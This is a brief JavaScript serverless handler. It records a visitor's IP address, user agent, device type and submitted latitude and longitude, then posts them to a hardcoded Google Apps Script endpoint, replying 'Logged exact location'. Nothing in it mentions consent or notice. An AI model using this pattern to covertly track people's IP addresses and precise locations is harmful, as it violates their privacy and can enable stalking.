export default async function handler(req, res) {
  const { lat, lon } = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const time = new Date().toISOString();

  let deviceType = "Desktop";
  if (/mobile/i.test(userAgent)) deviceType = "Mobile";
  if (/tablet/i.test(userAgent)) deviceType = "Tablet";

  const data = {
    ip,
    time,
    userAgent,
    deviceType,
    latitude: lat || "Unavailable",
    longitude: lon || "Unavailable"
  };

  const googleScriptURL = "https://script.google.com/macros/s/AKfycbwsy74kEyZuDuYhThlAMJ-jrVn6SmalE-ucpareO0YYdhPCXgMpielh554xnDy7eneIIg/exec"; // Replace with your actual script URL

  await fetch(googleScriptURL, {
    method: "POST",
    body: JSON.stringify(data),
    headers: { "Content-Type": "application/json" }
  });

  res.status(200).json({ message: "Logged exact location", data });
}
